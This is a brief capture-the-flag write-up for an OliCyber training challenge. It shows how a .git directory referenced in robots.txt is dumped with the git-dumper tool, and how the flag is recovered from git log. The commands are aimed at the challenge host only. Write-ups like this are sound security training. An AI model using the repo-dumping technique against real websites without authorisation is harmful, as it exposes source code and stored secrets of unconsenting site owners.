# URL
https://training.olicyber.it/challenges#challenge-55
# Concept
* robots.txt
* git repo dumping
* git log enum
# Method
* there's a `robots.txt` file on the server
* in that file there's reference to a `.git` directory
* we can dump the git repo using the `git-dumper` tool
* we can install the `git-dumper` tool using pip
```
pip install git-dumper
```
* we should probably do that in a virtual environment
```
python -m venv myenv
virtualenv myenv
cd myenv
source bin/activate
```
* then use `git-dumper` to dump the repo
```
git-dumper http://iforgot.challs.olicyber.it/.git iforgot/
```
* the flag is in the git logs
```
git log -p
```

